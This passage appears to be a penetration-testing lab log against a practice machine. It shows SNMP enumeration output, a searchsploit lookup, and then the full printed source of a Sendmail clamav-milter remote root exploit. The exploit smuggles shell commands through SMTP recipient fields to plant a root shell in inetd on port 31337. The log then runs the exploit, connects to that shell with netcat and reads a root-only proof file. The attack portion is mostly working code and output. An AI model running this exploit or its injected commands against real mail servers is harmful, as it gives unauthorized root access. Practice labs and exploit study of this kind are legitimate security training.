+  3797                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
+  3799                  runnable              smbd                  /usr/sbin/smbd        -D                  
+  3804                  runnable              sshd                  /usr/sbin/sshd                            
+  3882                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
+  3899                  runnable              atd                   /usr/sbin/atd                             
+  3902                  runnable              cron                  /usr/sbin/cron                            
+  3909                  runnable              apache                /usr/sbin/apache                          
+  3910                  runnable              apache                /usr/sbin/apache                          
+  3911                  runnable              apache                /usr/sbin/apache                          
+  3912                  runnable              apache                /usr/sbin/apache                          
+  3913                  runnable              apache                /usr/sbin/apache                          
+  3914                  runnable              apache                /usr/sbin/apache                          
+  3930                  runnable              getty                 /sbin/getty           38400 tty1          
+  3936                  runnable              getty                 /sbin/getty           38400 tty2          
+  3937                  runnable              getty                 /sbin/getty           38400 tty3          
+  3938                  runnable              getty                 /sbin/getty           38400 tty4          
+  3939                  runnable              getty                 /sbin/getty           38400 tty5          
+  3940                  runnable              getty                 /sbin/getty           38400 tty6          
+  4003                  runnable              apache                /usr/sbin/apache                          
+  4020                  runnable              apache                /usr/sbin/apache                          
+
+[*] Storage information:
+
+  Description                   : ["Real Memory"]
+  Device id                     : [#<SNMP::Integer:0x00007f454616cbb8 @value=2>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x00007f454616b240 @value=1024>]
+  Memory size                   : 250.82 MB
+  Memory used                   : 115.96 MB
+
+  Description                   : ["Swap Space"]
+  Device id                     : [#<SNMP::Integer:0x00007f4546166970 @value=3>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x00007f4546164ff8 @value=1024>]
+  Memory size                   : 203.91 MB
+  Memory used                   : 0 bytes
+
+  Description                   : ["/"]
+  Device id                     : [#<SNMP::Integer:0x00007f4546160908 @value=4>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x00007f45461bef30 @value=4096>]
+  Memory size                   : 3.74 GB
+  Memory used                   : 765.66 MB
+
+  Description                   : ["/sys"]
+  Device id                     : [#<SNMP::Integer:0x00007f45461ba638 @value=5>]
+  Filesystem type               : ["unknown"]
+  Device unit                   : [#<SNMP::Integer:0x00007f45461b8cc0 @value=4096>]
+  Memory size                   : 0 bytes
+  Memory used                   : 0 bytes
+
+[*] File system information:
+
+  Index                         : 1
+  Mount point                   : /
+  Remote mount point            : -
+  Access                        : 1
+  Bootable                      : 1
+
+[*] Device information:
+
+  Id                    Type                  Status                Descr               
+  768                   unknown               unknown               AuthenticAMD: AMD EPYC 7413 24-Core Processor
+  1025                  unknown               running               network interface lo
+  1026                  unknown               running               network interface eth0
+  1027                  unknown               down                  network interface sit0
+  1536                  unknown               unknown               VMware Virtual IDE CDROM Drive
+  1552                  unknown               unknown               SCSI disk (/dev/sda)
+  3072                  unknown               unknown               Guessing that there's a floating point co-processor
+
+scrot: Key was pressed, aborting shot
+
+$ scrot screenshots/snmp-check.png
+scrot: Key was pressed, aborting shot
+scrot: no image grabbed
+
+$ searchsploit sendmail clamav
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                                                                                                             | multiple/remote/4761.pl
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+$ cp /usr/share/exploitdb/exploits/multiple/remote/4761.pl exploits/
+
+$ cat exploits/4761.pl
+### black-hole.pl
+### Sendmail w/ clamav-milter Remote Root Exploit
+### Copyright (c) 2007 Eliteboy
+########################################################
+use IO::Socket;
+
+print "Sendmail w/ clamav-milter Remote Root Exploit\n";
+print "Copyright (C) 2007 Eliteboy\n";
+
+if ($#ARGV != 0) {print "Give me a host to connect.\n";exit;}
+
+print "Attacking $ARGV[0]...\n";
+
+$sock = IO::Socket::INET->new(PeerAddr  $ARGV[0],
+                              PeerPort  '25',
+                              Proto     'tcp');
+
+print $sock "ehlo you\r\n";
+print $sock "mail from: <>\r\n";
+print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n";
+print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n";
+print $sock "data\r\n.\r\nquit\r\n";
+
+while (<$sock>) {
+        print;
+}
+
+# milw0rm.com [2007-12-21]Sendmail w/ clamav-milter Remote Root Exploit
+
+# [Terminal 2] nc -nv $BoxIP 31337
+
+$ perl exploits/4761.pl $BoxIP
+Copyright (C) 2007 Eliteboy
+Attacking 192.168.128.42...
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 18 Aug 2026 22:41:25 -0400; (No UCE/UBE) logging access from: [192.168.45.173](FAIL)-[192.168.45.173]
+250-localhost.localdomain Hello [192.168.45.173], pleased to meet you
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-EXPN
+250-VERB
+250-8BITMIME
+250-SIZE
+250-DSN
+250-ETRN
+250-DELIVERBY
+250 HELP
+250 2.1.0 <>... Sender ok
+250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
+250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
+354 Enter mail, end with "." on a line by itself
+250 2.0.0 67J2fPFC004187 Message accepted for delivery
+221 2.0.0 localhost.localdomain closing connection
+
+# [revert — inetd state cleared, re-run exploit]
+# [Terminal 2] nc -nv $BoxIP 31337
+
+$ perl exploits/4761.pl $BoxIP
+Sendmail w/ clamav-milter Remote Root Exploit
+Copyright (C) 2007 Eliteboy
+Attacking 192.168.128.42...
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Tue, 18 Aug 2026 22:45:27 -0400; (No UCE/UBE) logging access from: [192.168.45.173](FAIL)-[192.168.45.173]
+250-localhost.localdomain Hello [192.168.45.173], pleased to meet you
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-EXPN
+250-VERB
+250-8BITMIME
+250-SIZE
+250-DSN
+250-ETRN
+250-DELIVERBY
+250 HELP
+250 2.1.0 <>... Sender ok
+250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
+250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
+354 Enter mail, end with "." on a line by itself
+250 2.0.0 67J2jRHe004207 Message accepted for delivery
+221 2.0.0 localhost.localdomain closing connection
+
+# [Terminal 2 — nc connected to port 31337, typing blind]
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# hostname
+0xbabe.local
+# ip a
+-i: line 3: ip: command not found
+# ls /root/
+/root/proof.txt
+# cat /root/proof.txt
+-i: line 5: cat: command not found
+# while read line; do echo "$line"; done < /root/proof.txt
+16e6693d3fc7c6ac736bceae41ef7bcf
+
+$ ls
+exploits
+loot
+nmap
+screenshots
+snmp-walk.txt
+www
+clamAV.log
+
+$ ls
+exploits
+loot
+nmap
+screenshots
+snmp-walk.txt
+www
